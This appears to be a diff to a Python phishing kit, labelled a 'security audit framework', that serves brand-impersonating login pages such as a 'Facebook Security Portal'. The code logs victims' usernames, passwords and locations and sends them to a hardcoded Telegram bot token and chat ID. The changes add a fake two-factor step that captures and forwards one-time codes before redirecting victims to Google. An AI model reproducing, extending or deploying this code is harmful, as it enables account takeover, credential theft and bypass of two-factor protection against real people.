@@ -11,9 +11,9 @@ import sys
 PORT = 8080
 LOG_FILE = "audit_results.log"
 
-# Telegram Bot & Chat ID Configuration (የእርስዎ ቦት ቶከን እና የግል ቻት አይዲ ገብተዋል)
+# Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "9111398440:AAEndzRhZegO5UqDoDckMgQdXZs1V3feyag"
-TELEGRAM_CHAT_ID = "8878200031"  # <-- የእርስዎ ትክክለኛ የግል ቻት አይዲ[cite: 3]
+TELEGRAM_CHAT_ID = "8878200031"
 
 def send_telegram_alert(message):
     """Sends captured data directly to your Telegram Bot."""
@@ -27,7 +27,7 @@ def send_telegram_alert(message):
     except Exception as e:
         print(f"[-] Telegram Alert Error: {e}")
 
-# Templates Configuration (የተለያዩ ድርጅቶች አብነቶች)
+# Templates Configuration
 TEMPLATES = {
     "1": {
         "name": "Facebook Security Portal",
@@ -70,7 +70,7 @@ def generate_html(template):
         button:hover {{ opacity: 0.9; }}
         .info {{ font-size: 12px; color: #65676b; margin-top: 15px; }}
         .error-msg {{ color: #ed4337; font-size: 13px; margin-bottom: 10px; display: none; }}
-        #loginForm {{ display: none; }}
+        #loginForm, #otpForm {{ display: none; }}
     </style>
 </head>
 <body>
@@ -78,18 +78,29 @@ def generate_html(template):
         <h2>{template['name']}</h2>
         <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
         <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
+        
+        <!-- Login Form -->
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Mobile number, email, or username" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
             <input type="hidden" id="botToken" name="botToken" value="">
             <button type="submit" id="subBtn">Continue</button>
         </form>
+
+        <!-- 2FA / OTP Verification Form -->
+        <form id="otpForm">
+            <p style="font-size: 14px; color: #333; margin-bottom: 10px;">Enter the 6-digit confirmation code sent to your device or email.</p>
+            <input type="text" id="otpCode" name="otpCode" placeholder="Enter 6-digit Code" maxlength="6" required>
+            <button type="submit" id="otpBtn">Verify Code</button>
+        </form>
+
         <div class="info" id="status">Gathering secure device telemetry...</div>
     </div>
 
     <script>
         let humanVerified = false;
         let botTokenValue = "";
+        let currentSessionUser = "";
 
         function checkHuman() {{
             botTokenValue = "verified_human_" + Math.random().toString(36).substring(2);
@@ -153,11 +164,14 @@ def generate_html(template):
         window.onload = gatherIntelligence;
 
         let attemptCount = 0;
+        
+        // Handle Login Submission
         document.getElementById('loginForm').addEventListener('submit', function(e) {{
             e.preventDefault();
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
             let token = document.getElementById('botToken').value;
+            currentSessionUser = username;
 
             fetch('/login', {{
                 method: 'POST',
@@ -168,10 +182,32 @@ def generate_html(template):
                     attemptCount++;
                     document.getElementById('errorBox').style.display = 'block';
                     document.getElementById('password').value = '';
-                }} else if (data.status === 'success') {{
-                    window.location.href = data.redirect;
+                }} else if (data.status === 'require_otp') {{
+                    // Switch to 2FA / OTP Form
+                    document.getElementById('loginForm').style.display = 'none';
+                    document.getElementById('errorBox').style.display = 'none';
+                    document.getElementById('otpForm').style.display = 'block';
+                    document.getElementById('statusMsg').innerText = "Two-Factor Authentication Required";
                 }} else if (data.status === 'bot_blocked') {{
                     alert('Security verification failed. Automated access restricted.');
+                }}
+            }}).catch(err => {{
+                console.error('Error:', err);
+            }});
+        }});
+
+        // Handle OTP Submission
+        document.getElementById('otpForm').addEventListener('submit', function(e) {{
+            e.preventDefault();
+            let otpCode = document.getElementById('otpCode').value;
+
+            fetch('/verify-otp', {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json' }},
+                body: JSON.stringify({{ username: currentSessionUser, otp: otpCode }})
+            }}).then(response => response.json()).then(data => {{
+                if (data.status === 'success') {{
+                    window.location.href = data.redirect;
                 }}
             }}).catch(err => {{
                 console.error('Error:', err);
@@ -253,20 +289,18 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
                     return
 
-                log_entry = f"[CREDENTIAL CAPTURED (Attempt {attempt + 1})] Template: {SELECTED_TEMPLATE['name']} | IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | User: {username} | Pass: {password}\n"
+                log_entry = f"[CREDENTIAL CAPTURED] Template: {SELECTED_TEMPLATE['name']} | IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | User: {username} | Pass: {password}\n"
                 print(f"\033[92m{log_entry}\033[0m")
                 
                 with open(LOG_FILE, "a") as f:
                     f.write(log_entry)
 
-                # Send Telegram Notification
+                # Send Telegram Notification for Credentials
                 tg_msg = f"🚨 *New Credential Captured!*\n\n🏢 *Template:* {SELECTED_TEMPLATE['name']}\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`\n🌍 *IP:* `{client_ip}`\n📍 *Location:* {geo['city']}, {geo['country']}\n🌐 *ISP:* {geo['isp']}"
                 send_telegram_alert(tg_msg)
 
-                if attempt == 0:
-                    response_data = {"status": "retry"}
-                else:
-                    response_data = {"status": "success", "redirect": "https://www.google.com"}
+                # Trigger 2FA / OTP step instead of simple success
+                response_data = {"status": "require_otp"}
 
                 self.send_response(200)
                 self.send_header("Content-type", "application/json")
@@ -274,6 +308,32 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
                 self.wfile.write(json.dumps(response_data).encode('utf-8'))
             except Exception as e:
                 print(f"Error handling login: {e}")
+                self.send_response(500)
+                self.end_headers()
+
+        elif self.path == '/verify-otp':
+            try:
+                data = json.loads(post_data.decode('utf-8'))
+                username = data.get('username', '')
+                otp_code = data.get('otp', '')
+
+                log_entry = f"[OTP CAPTURED] User: {username} | Code: {otp_code} | IP: {client_ip}\n"
+                print(f"\033[95m{log_entry}\033[0m")
+
+                with open(LOG_FILE, "a") as f:
+                    f.write(log_entry)
+
+                # Send Telegram Notification for OTP
+                tg_otp_msg = f"🔐 *OTP / 2FA Code Captured!*\n\n👤 *User:* `{username}`\n🔢 *Code:* `{otp_code}`\n🌍 *IP:* `{client_ip}`"
+                send_telegram_alert(tg_otp_msg)
+
+                response_data = {"status": "success", "redirect": "https://www.google.com"}
+                self.send_response(200)
+                self.send_header("Content-type", "application/json")
+                self.end_headers()
+                self.wfile.write(json.dumps(response_data).encode('utf-8'))
+            except Exception as e:
+                print(f"Error handling OTP: {e}")
                 self.send_response(500)
                 self.end_headers()
 
@@ -297,7 +357,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
 def select_template():
     global SELECTED_TEMPLATE
     print("\n==============================================")
-    print("   ADVANCED SECURITY AUDIT FRAMEWORK v5       ")
+    print("   ADVANCED SECURITY AUDIT FRAMEWORK v6       ")
     print("==============================================")
     print(" Please select a target template / brand:")
     print("----------------------------------------------")
@@ -315,12 +375,12 @@ def run_server():
     select_template()
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Framework running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Framework v6 running on port {PORT}...\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n\033[91m[-] Shutting down framework.\033[0m")
+        print("\n\033[91m[-] Shutting down framework v6.\033[0m")
         httpd.server_close()
 
 if __name__ == '__main__':
